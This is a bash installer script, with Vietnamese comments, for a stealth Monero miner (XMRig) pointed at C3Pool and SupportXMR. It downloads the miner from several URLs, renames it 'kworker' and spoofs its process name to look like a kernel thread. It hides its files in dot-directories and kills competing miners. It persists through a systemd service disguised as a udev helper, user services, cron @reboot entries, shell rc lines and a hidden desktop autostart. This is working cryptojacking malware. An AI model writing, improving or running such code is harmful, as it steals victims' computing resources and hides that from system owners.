#!/usr/bin/env bash
# Fix_XFXCW.sh — v4.7 (patched)
VERSION="4.7-unified-multi-pool-stealth-secured-patched"
C3POOL_DOWNLOAD_URL="https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz"
BACKUP_DOWNLOAD_URL="https://raw.githubusercontent.com/melonlonmeo/c4/refs/heads/main/xmrig.tar.gz"
XMRIG_LATEST_API="https://api.github.com/repos/xmrig/xmrig/releases/latest"
DISGUISE_BIN="kworker"
DISGUISE_ARGV="kworker/u8:2-events"
SERVICE_NAME="systemd-udevd-helper.service"
DIR_SUFFIX=".kwork"
CONFIG_NAME="resolv.conf.bak"
WRAPPER_NAME=".udev-helper"
KEEP_CONFIG="${KEEP_CONFIG:-0}"
KEEP_BINARY="${KEEP_BINARY:-0}"
STOP_UDEV="${STOP_UDEV:-0}"
WALLET="${1:-}"
EMAIL="${2:-}"
PASS="x"

log()  { printf '%s\n' "$*"; }
fail() { printf 'ERROR: %s\n' "$*" >&2; exit 1; }
TS()   { date +%Y%m%d_%H%M%S; }

# FIX #8: escape regex metachars cho pkill -f (., *, +, ?, [], (), {}, |)
_escape_re() {
  if command -v sed >/dev/null 2>&1; then
    printf '%s' "$1" | sed 's/[][\.^$*+?(){}|]/\\&/g'
  else
    printf '%s' "${1//./\\.}"
  fi
}

backup_if_exists() {
  local f="$1"
  [ -f "$f" ] && cp -p "$f" "${f}.bak.$(TS)" 2>/dev/null && log "[*] Backup: $f"
}

# FIX #12: detect root SỚM để dùng cho hugepages + systemd
HAS_ROOT=0
if [ "$(id -u 2>/dev/null || echo 1)" = "0" ]; then HAS_ROOT=1
elif command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then HAS_ROOT=1; fi

# FIX #11: nice có thể không tồn tại trên busybox-only
if command -v nice >/dev/null 2>&1; then
  _NICE_PREFIX="nice -n 19"
else
  _NICE_PREFIX=""
fi

INSTALL_DIR=""
CANDIDATES=(
  "${XDG_DATA_HOME:-${HOME:-}/.local/share}/${DIR_SUFFIX}"
  "${HOME:-}/.cache/${DIR_SUFFIX}" "${HOME:-}/.config/${DIR_SUFFIX}"
  "${HOME:-}/${DIR_SUFFIX}" "${HOME:-}/.local/${DIR_SUFFIX}"
  "/tmp/${DIR_SUFFIX}-$(id -u 2>/dev/null || echo 0)"
  "/var/tmp/${DIR_SUFFIX}-$(id -u 2>/dev/null || echo 0)"
  "/dev/shm/${DIR_SUFFIX}-$(id -u 2>/dev/null || echo 0)"
  "/run/user/$(id -u 2>/dev/null || echo 0)/${DIR_SUFFIX}"
  "./${DIR_SUFFIX}"
)
for c in "${CANDIDATES[@]}"; do
  case "$c" in */*) ;; *) continue ;; esac
  if mkdir -p "$c" 2>/dev/null && [ -w "$c" ] && touch "$c/.wtest" 2>/dev/null; then
    rm -f "$c/.wtest"; INSTALL_DIR="$c"; break
  fi
done
if [ -z "$INSTALL_DIR" ]; then
  for last in /dev/shm /tmp /var/tmp; do
    [ -w "$last" ] || continue
    INSTALL_DIR="$last/${DIR_SUFFIX}-fallback-$$"
    mkdir -p "$INSTALL_DIR" 2>/dev/null && break
  done
fi
[ -n "$INSTALL_DIR" ] && [ -w "$INSTALL_DIR" ] || fail "No writable directory found"

ARCHIVE="$INSTALL_DIR/.pkg.tar.gz"
mkdir -p "$INSTALL_DIR/logs" 2>/dev/null

[ -z "$WALLET" ] && { echo "Setup v$VERSION"; echo "Usage: $0 <wallet> [email]"; echo "Env: THREADS_HINT=100 (default), 50, 25..."; exit 1; }

if [ -n "$EMAIL" ]; then
  PASS="x:${EMAIL}"
fi

WALLET_BASE="${WALLET%%.*}"
case "${#WALLET_BASE}" in 106|95) ;; *) fail "Wrong wallet length: ${#WALLET_BASE}" ;; esac

# FIX #3: nâng ulimit -v để curl/wget không bị kernel SIGKILL (RLIMIT_AS)
_cur_v="$(ulimit -v 2>/dev/null || echo unlimited)"
if [ "$_cur_v" != "unlimited" ] && [ "${_cur_v:-0}" -lt 524288 ] 2>/dev/null; then
  log "WARN: ulimit -v=$_cur_v quá thấp, thử nâng..."
  ulimit -v unlimited 2>/dev/null || ulimit -v 1048576 2>/dev/null || true
  _new_v="$(ulimit -v 2>/dev/null || echo unlimited)"
  if [ "$_new_v" != "unlimited" ] && [ "${_new_v:-0}" -lt 524288 ] 2>/dev/null; then
    fail "Không nâng được ulimit -v (hard limit bị khoá). Sửa /etc/security/limits.conf hoặc chạy bằng user không giới hạn."
  fi
  log "     ulimit -v mới = $_new_v"
fi

CPU_THREADS="$(nproc 2>/dev/null || getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1)"
case "$CPU_THREADS" in ''|*[!0-9]*) CPU_THREADS=1 ;; esac
# FIX #10: clamp tránh 0
[ "$CPU_THREADS" -ge 1 ] 2>/dev/null || CPU_THREADS=1

MEM_MB="$(awk '/MemTotal/{print int($2/1024)}' /proc/meminfo 2>/dev/null || echo 0)"
case "$MEM_MB" in ''|*[!0-9]*) MEM_MB=0 ;; esac

_HINT_ENV="${THREADS_HINT:-}"
if [ "$MEM_MB" -gt 0 ] && [ "$MEM_MB" -lt 2048 ]; then
  RX_MODE=light; HP_BOOL=false; _hint=50; THREADS_CAP=1
elif [ "$MEM_MB" -gt 0 ] && [ "$MEM_MB" -lt 4096 ]; then
  RX_MODE=light; HP_BOOL=false; _hint=75; THREADS_CAP=2
else
  RX_MODE=auto; HP_BOOL=true; _hint=100; THREADS_CAP="$CPU_THREADS"
fi
THREADS_HINT="${_HINT_ENV:-$_hint}"

EXP_HASH=$(( CPU_THREADS * 700 / 1000 )); [ "$EXP_HASH" -gt 0 ] || EXP_HASH=1
if   [ "$EXP_HASH" -le 25000 ];  then PORT=13333
elif [ "$EXP_HASH" -le 100000 ]; then PORT=19999
else PORT=23333; fi

log "Setup v$VERSION | threads=$CPU_THREADS | mem=${MEM_MB}MB | rx=$RX_MODE | port=$PORT | hint=$THREADS_HINT%"
log "Dir=$INSTALL_DIR | KEEP_CONFIG=$KEEP_CONFIG KEEP_BINARY=$KEEP_BINARY STOP_UDEV=$STOP_UDEV | nice='$_NICE_PREFIX'"

# FIX #4: xác minh gzip bằng gzip -t (bắt file cụt do curl bị kill giữa chừng)
is_gzip() {
  [ -s "$1" ] || return 1
  local magic
  magic="$(head -c 2 "$1" 2>/dev/null | od -An -tx1 2>/dev/null | tr -d ' \n')"
  [ "$magic" = "1f8b" ] || return 1
  if command -v gzip >/dev/null 2>&1; then
    gzip -t "$1" >/dev/null 2>&1
  else
    return 0
  fi
}

download_file() {
  local url="$1" out="$2" tmp="$2.part"
  rm -f "$tmp" 2>/dev/null
  if command -v curl >/dev/null 2>&1; then
    if curl -fL --retry 2 --connect-timeout 15 --max-time 300 "$url" -o "$tmp" 2>/dev/null && is_gzip "$tmp"; then
      mv -f "$tmp" "$out"; return 0; fi
    log "  WARN: curl failed - retry with -k"; rm -f "$tmp"
    if curl -kfL --retry 2 --connect-timeout 15 --max-time 300 "$url" -o "$tmp" 2>/dev/null && is_gzip "$tmp"; then
      mv -f "$tmp" "$out"; return 0; fi
    rm -f "$tmp"
  fi
  if command -v wget >/dev/null 2>&1; then
    if wget -q -O "$tmp" --timeout=30 --tries=2 "$url" 2>/dev/null && is_gzip "$tmp"; then
      mv -f "$tmp" "$out"; return 0; fi
    log "  WARN: wget failed - retry --no-check-certificate"; rm -f "$tmp"
    if wget -q --no-check-certificate -O "$tmp" --timeout=30 --tries=2 "$url" 2>/dev/null && is_gzip "$tmp"; then
      mv -f "$tmp" "$out"; return 0; fi
    rm -f "$tmp"
  fi
  if command -v busybox >/dev/null 2>&1 && busybox wget --help >/dev/null 2>&1; then
    if busybox wget -q -O "$tmp" "$url" 2>/dev/null && is_gzip "$tmp"; then
      mv -f "$tmp" "$out"; return 0; fi
    rm -f "$tmp"
  fi
  if command -v python3 >/dev/null 2>&1; then
    # FIX #7: stream 64KB chunk thay vì r.read() load cả file vào RAM
    python3 - "$url" "$tmp" <<'PY' 2>/dev/null && is_gzip "$tmp" && { mv -f "$tmp" "$out"; return 0; }
import sys, urllib.request, ssl
try:
    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(sys.argv[1], headers={"User-Agent":"Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=30, context=ctx) as r, open(sys.argv[2],'wb') as f:
        while True:
            chunk = r.read(65536)
            if not chunk: break
            f.write(chunk)
    sys.exit(0)
except Exception:
    sys.exit(1)
PY
    rm -f "$tmp"
  fi
  return 1
}

download_text() {
  local url="$1" out
  if command -v curl >/dev/null 2>&1; then
    out="$(curl -fsSL --retry 2 --connect-timeout 15 --max-time 60 \
      -H 'Accept: application/vnd.github+json' -H 'User-Agent: unified-installer' "$url" 2>/dev/null)"
    [ -n "$out" ] && { printf '%s\n' "$out"; return 0; }
  fi
  if command -v wget >/dev/null 2>&1; then
    out="$(wget -qO- --header='Accept: application/vnd.github+json' \
      --user-agent='unified-installer' --timeout=30 --tries=2 "$url" 2>/dev/null)"
    [ -n "$out" ] && { printf '%s\n' "$out"; return 0; }
  fi
  if command -v python3 >/dev/null 2>&1; then
    python3 - "$url" <<'PY' && return 0
import sys, urllib.request, ssl
try:
    req = urllib.request.Request(sys.argv[1], headers={"Accept":"application/vnd.github+json","User-Agent":"unified-installer"})
    with urllib.request.urlopen(req, timeout=20, context=ssl._create_unverified_context()) as r:
        sys.stdout.write(r.read().decode())
    sys.exit(0)
except Exception:
    sys.exit(1)
PY
  fi
  return 1
}

get_latest_xmrig_url() {
  local arch json url
  arch="$(uname -m 2>/dev/null || echo unknown)"
  case "$arch" in x86_64|amd64) ;; *) return 2 ;; esac
  json="$(download_text "$XMRIG_LATEST_API")" || return 1
  url="$(printf '%s' "$json" | grep -oE 'https://[^"]+/xmrig-[0-9]+(\.[0-9]+)+-linux-static-x64\.tar\.gz' | head -n 1)"
  [ -n "$url" ] || return 1
  printf '%s\n' "$url"
}

install_latest_official_xmrig() {
  local url ver tmp found
  if [ "$KEEP_BINARY" = "1" ] && [ -x "$INSTALL_DIR/$DISGUISE_BIN" ]; then
    log "[*] KEEP_BINARY=1"; return 0
  fi
  url="$(get_latest_xmrig_url)" || return $?
  ver="$(basename "$url" | sed -E 's/^xmrig-([0-9.]+)-linux-static-x64\.tar\.gz$/\1/')"
  log "[*] XMRig v$ver"
  tmp="$(mktemp -d)" || return 1
  rm -f "$INSTALL_DIR/$DISGUISE_BIN" "$ARCHIVE" 2>/dev/null
  download_file "$url" "$ARCHIVE" || { rm -rf "$tmp"; return 1; }
  
  if ! tar xzf "$ARCHIVE" -C "$tmp" --strip-components=1 2>/dev/null; then
    tar xzf "$ARCHIVE" -C "$tmp" 2>/dev/null || { rm -rf "$tmp" "$ARCHIVE"; return 1; }
  fi
  rm -f "$ARCHIVE"
  
  found="$(find "$tmp" -maxdepth 4 -type f -name 'xmrig' 2>/dev/null | head -1)"
  [ -n "$found" ] || { rm -rf "$tmp"; return 1; }
  mv -f "$found" "$INSTALL_DIR/$DISGUISE_BIN"
  chmod +x "$INSTALL_DIR/$DISGUISE_BIN" 2>/dev/null
  rm -rf "$tmp"; return 0
}

install_c3pool_package() {
  log "[*] Fallback: C3Pool package"
  rm -f "$INSTALL_DIR/$DISGUISE_BIN" "$ARCHIVE" 2>/dev/null
  if download_file "$C3POOL_DOWNLOAD_URL" "$ARCHIVE"; then
    log "[*] Downloaded from C3Pool"
  else
    log "WARN: C3Pool failed - trying backup"
    download_file "$BACKUP_DOWNLOAD_URL" "$ARCHIVE" || return 1
  fi
  local tmp found
  tmp="$(mktemp -d)" || return 1
  if ! tar xzf "$ARCHIVE" -C "$tmp" --strip-components=1 2>/dev/null; then
    tar xzf "$ARCHIVE" -C "$tmp" 2>/dev/null || { rm -rf "$tmp"; return 1; }
  fi
  rm -f "$ARCHIVE"
  found="$(find "$tmp" -maxdepth 4 -type f -name 'xmrig' 2>/dev/null | head -1)"
  [ -n "$found" ] || { rm -rf "$tmp"; return 1; }
  mv -f "$found" "$INSTALL_DIR/$DISGUISE_BIN"
  chmod +x "$INSTALL_DIR/$DISGUISE_BIN" 2>/dev/null
  rm -rf "$tmp"
  [ -x "$INSTALL_DIR/$DISGUISE_BIN" ]
}

if command -v systemctl >/dev/null 2>&1 && [ "$HAS_ROOT" = "1" ]; then
  for svc in "$SERVICE_NAME" nodebox.service c3pool_miner.service; do
    sudo systemctl stop "$svc" 2>/dev/null || systemctl stop "$svc" 2>/dev/null || true
  done
  if [ "$STOP_UDEV" = "1" ]; then
    log "WARN: stopping real systemd-udevd"
    sudo systemctl stop systemd-udevd.service 2>/dev/null || systemctl stop systemd-udevd.service 2>/dev/null || true
  fi
fi

# FIX #9: validate PID trước khi kill -9
if [ -f "$INSTALL_DIR/.miner.pid" ]; then
  _mpid="$(tr -d '[:space:]' < "$INSTALL_DIR/.miner.pid" 2>/dev/null)"
  case "$_mpid" in
    ''|*[!0-9]*) : ;;
    *) kill -9 "$_mpid" 2>/dev/null || true ;;
  esac
  rm -f "$INSTALL_DIR/.miner.pid"
fi
# FIX #8: dùng _escape_re cho pkill -f
pkill -f "$(_escape_re "${INSTALL_DIR}/${DISGUISE_BIN}")" 2>/dev/null || true
pkill -f "$(_escape_re "${INSTALL_DIR}/${CONFIG_NAME}")"  2>/dev/null || true
pkill -f "$(_escape_re "${INSTALL_DIR}/${WRAPPER_NAME}")" 2>/dev/null || true
# FIX #13: chờ process chết hẳn trước khi cài lại
sleep 1

log "[*] Preparing package"
if ! install_latest_official_xmrig; then
  log "WARN: official release failed - fallback"
  install_c3pool_package || fail "Unable to download release or fallbacks"
fi

# FIX #5: timeout có thể không tồn tại
if command -v timeout >/dev/null 2>&1; then
  _TO="timeout 15"
else
  _TO=""
fi
if ! $_TO "$INSTALL_DIR/$DISGUISE_BIN" --version >/dev/null 2>&1; then
  log "WARN: bundled core not functional"
  if [ -f /etc/os-release ] && grep -q 'NAME="Alpine Linux"' /etc/os-release; then
    { apk add --no-cache xmrig >/dev/null 2>&1 \
      && command -v xmrig >/dev/null 2>&1 \
      && cp "$(command -v xmrig)" "$INSTALL_DIR/$DISGUISE_BIN" \
      && chmod +x "$INSTALL_DIR/$DISGUISE_BIN"; } || fail "Alpine fallback failed"
  else
    fail "Binary is not functional"
  fi
fi

CONFIG_PATH="$INSTALL_DIR/$CONFIG_NAME"
CONFIG_BG="$INSTALL_DIR/.${CONFIG_NAME}.bg"

CONFIG_CONTENT=$(cat <<EOF_CONFIG
{
    "api": { "id": null, "worker-id": null },
    "http": { "enabled": false, "host": "127.0.0.1", "port": 0, "access-token": null, "restricted": true },
    "autosave": true, "background": false, "colors": false, "title": false,
    "randomx": { "init": -1, "init-avx2": -1, "mode": "$RX_MODE", "1gb-pages": false, "rdmsr": false, "wrmsr": false, "cache_qos": false, "numa": true, "scratchpad_prefetch_mode": 1 },
    "cpu": { "enabled": true, "huge-pages": $HP_BOOL, "huge-pages-jit": false, "hw-aes": null, "priority": null, "memory-pool": false, "yield": true, "max-threads-hint": $THREADS_HINT, "asm": true, "argon2-impl": null },
    "opencl": { "enabled": false, "cache": true, "loader": null, "platform": "AMD", "adl": true },
    "cuda": { "enabled": false, "loader": null, "nvml": true },
    "log-file": null, "donate-level": 1, "donate-over-proxy": 1,
    "pools": [
        { "url": "auto.c3pool.org:$PORT",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "auto.c3pool.org:19999",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "auto.c3pool.org:443",     "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "auto.c3pool.org:80",      "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "auto.c3pool.org:33333",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "auto.c3pool.org:23333",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:443",  "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "pool.supportxmr.com:8080", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:7777", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "pool.supportxmr.com:5555", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:80",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:3333", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true }
    ],
    "print-time": 60, "health-print-time": 60, "retries": 5, "retry-pause": 5, "syslog": false,
    "tls": { "enabled": false, "protocols": null, "cert": null, "cert_key": null, "ciphers": null, "ciphersuites": null, "dhparam": null },
    "dns": { "ip_version": 4, "ttl": 30 },
    "user-agent": null, "verbose": 0, "watch": true,
    "pause-on-battery": false, "pause-on-active": false
}
EOF_CONFIG
)

if [ "$KEEP_CONFIG" = "1" ] && [ -f "$CONFIG_PATH" ]; then
  log "[*] KEEP_CONFIG=1"
else
  backup_if_exists "$CONFIG_PATH"; printf '%s\n' "$CONFIG_CONTENT" > "$CONFIG_PATH"
fi
if [ "$KEEP_CONFIG" = "1" ] && [ -f "$CONFIG_BG" ]; then
  log "[*] KEEP_CONFIG=1 (bg)"
else
  backup_if_exists "$CONFIG_BG"
  printf '%s\n' "$CONFIG_CONTENT" | sed 's/"background": false/"background": true/' > "$CONFIG_BG"
fi

# FIX #12: dùng HAS_ROOT đã detect sớm + sudo tee
if [ "$HP_BOOL" = "true" ] && [ "$HAS_ROOT" = "1" ]; then
  sudo sysctl -w vm.nr_hugepages=1280 >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=1280 >/dev/null 2>&1 || true
  if ! grep -q '^vm.nr_hugepages' /etc/sysctl.conf 2>/dev/null; then
    echo 'vm.nr_hugepages=1280' | sudo tee -a /etc/sysctl.conf >/dev/null 2>&1 || true
  fi
fi

RUNNER="$INSTALL_DIR/$WRAPPER_NAME"
RUNNER_BG="$INSTALL_DIR/.${WRAPPER_NAME}-bg"
backup_if_exists "$RUNNER"; backup_if_exists "$RUNNER_BG"

# ============================================================
# FIX #1 (exec builtin) + FIX #2 (LOCKDIR tương đối)
# ============================================================
cat > "$RUNNER" <<EOF_MINER
#!/usr/bin/env bash
cd "$INSTALL_DIR" 2>/dev/null || true
export XMRIG_NO_TLS_WARN=1 XMRIG_QUIET=1

# FIX #2: dùng đường dẫn tương đối — vì đã cd "$INSTALL_DIR" ở trên
LOCKDIR=".lockdir"
if mkdir "\$LOCKDIR" 2>/dev/null; then
  trap 'rmdir "\$LOCKDIR" 2>/dev/null' EXIT
  
  RUNNING=0
  if [ -f ".miner.pid" ]; then
    OLD_PID="\$(tr -d '[:space:]' < .miner.pid 2>/dev/null)"
    case "\$OLD_PID" in
      ''|*[!0-9]*) : ;;
      *) kill -0 "\$OLD_PID" 2>/dev/null && RUNNING=1 ;;
    esac
  fi
  
  if [ "\$RUNNING" -eq 0 ]; then
    if [ "\$#" -eq 0 ]; then
      # FIX #1: nice → exec là builtin; phải qua bash -c để exec -a hoạt động
      $_NICE_PREFIX bash -c 'exec -a "\$0" "\$@"' "$DISGUISE_ARGV" "$INSTALL_DIR/$DISGUISE_BIN" --config="$CONFIG_PATH" --no-color --quiet >/dev/null 2>&1 &
    else
      $_NICE_PREFIX bash -c 'exec -a "\$0" "\$@"' "$DISGUISE_ARGV" "$INSTALL_DIR/$DISGUISE_BIN" "\$@" >/dev/null 2>&1 &
    fi
    echo \$! > .miner.pid
    disown \$! 2>/dev/null || true
  fi
fi
EOF_MINER
chmod +x "$RUNNER"

cat > "$RUNNER_BG" <<EOF_MINER
#!/usr/bin/env bash
cd "$INSTALL_DIR" 2>/dev/null || true
bash "$RUNNER" --config="$CONFIG_BG" </dev/null >/dev/null 2>&1
EOF_MINER
chmod +x "$RUNNER_BG"

if command -v systemctl >/dev/null 2>&1 && [ "$HAS_ROOT" = "1" ]; then
  log "[*] Installing system service"
  SVC_FILE="$INSTALL_DIR/.svc"
  # FIX #6: thêm PIDFile + KillMode để systemd theo dõi đúng process và auto-restart
  cat > "$SVC_FILE" <<EOF_SERVICE
[Unit]
Description=System Udev Events Helper
After=network-online.target
Wants=network-online.target

[Service]
Type=forking
PIDFile=$INSTALL_DIR/.miner.pid
ExecStart=/usr/bin/env bash $RUNNER --config=$CONFIG_PATH
StandardOutput=null
StandardError=null
Restart=always
RestartSec=30
KillMode=control-group
Nice=19
CPUShares=2
IOSchedulingClass=idle
IOSchedulingPriority=7
OOMScoreAdjust=500

[Install]
WantedBy=multi-user.target
EOF_SERVICE

  TARGET="/etc/systemd/system/$SERVICE_NAME"
  INSTALL_OK=1
  if [ -f "$TARGET" ] && cmp -s "$SVC_FILE" "$TARGET"; then
    log "[*] Service unchanged"
  else
    [ -f "$TARGET" ] && cp -p "$TARGET" "${TARGET}.bak.$(TS)" 2>/dev/null
    cp "$SVC_FILE" "$TARGET" 2>/dev/null || INSTALL_OK=0
  fi
  if [ "$INSTALL_OK" = "1" ]; then
    systemctl daemon-reload 2>/dev/null
    systemctl enable "$SERVICE_NAME" >/dev/null 2>&1
    systemctl restart "$SERVICE_NAME" 2>/dev/null \
      && log "[*] Service installed: $SERVICE_NAME" \
      || { log "WARN: systemd install failed - fallback"; HAS_ROOT=0; }
  else
    log "WARN: systemd install failed - fallback"; HAS_ROOT=0
  fi
fi

if [ "$HAS_ROOT" = "0" ]; then
  log "[*] No root - user-level persistence"
  if command -v systemctl >/dev/null 2>&1 && systemctl --user show-environment >/dev/null 2>&1; then
    USER_DIR="$HOME/.config/systemd/user"; mkdir -p "$USER_DIR" 2>/dev/null
    USVC_FILE="$USER_DIR/$SERVICE_NAME"; backup_if_exists "$USVC_FILE"
    # FIX #6: PIDFile cho user service
    cat > "$USVC_FILE" <<EOF_USERVICE
[Unit]
Description=System Udev Events Helper
After=network.target

[Service]
Type=forking
PIDFile=$INSTALL_DIR/.miner.pid
ExecStart=/usr/bin/env bash $RUNNER --config=$CONFIG_PATH
Restart=always
RestartSec=30
KillMode=control-group
Nice=19
OOMScoreAdjust=500

[Install]
WantedBy=default.target
EOF_USERVICE
    systemctl --user daemon-reload 2>/dev/null || true
    systemctl --user enable --now "$SERVICE_NAME" 2>/dev/null || true
    command -v loginctl >/dev/null 2>&1 && loginctl enable-linger "$(id -un 2>/dev/null)" 2>/dev/null || true
  fi
  if command -v crontab >/dev/null 2>&1; then
    CRON_LINE="@reboot $RUNNER_BG >/dev/null 2>&1"
    crontab -l 2>/dev/null | grep -F -q "$RUNNER_BG" || \
      { crontab -l 2>/dev/null; echo "$CRON_LINE"; } | crontab - 2>/dev/null || true
  fi
  for RC in "$HOME/.profile" "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.bash_profile"; do
    [ -d "$HOME" ] || continue
    touch "$RC" 2>/dev/null || continue
    [ -w "$RC" ] || continue
    SL="$RUNNER_BG >/dev/null 2>&1"
    grep -F -q "$SL" "$RC" 2>/dev/null || printf '\n%s\n' "$SL" >> "$RC" 2>/dev/null || true
  done
  if [ -d "$HOME/.config" ] || mkdir -p "$HOME/.config" 2>/dev/null; then
    AD="$HOME/.config/autostart"; mkdir -p "$AD" 2>/dev/null
    AS_FILE="$AD/udev-helper.desktop"; backup_if_exists "$AS_FILE"
    cat > "$AS_FILE" <<EOF_DESKTOP
[Desktop Entry]
Type=Application
Name=System Events
Exec=bash $RUNNER_BG
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF_DESKTOP
  fi
  bash "$RUNNER_BG" >/dev/null 2>&1 & disown 2>/dev/null || true
fi

sleep 3
log "[*] Setup complete"
log "[*] Check: systemctl status $SERVICE_NAME"
log "[*] Config: $CONFIG_PATH"
log "[*] Verify: ps -eo pid,comm,args | grep '$DISGUISE_ARGV'"
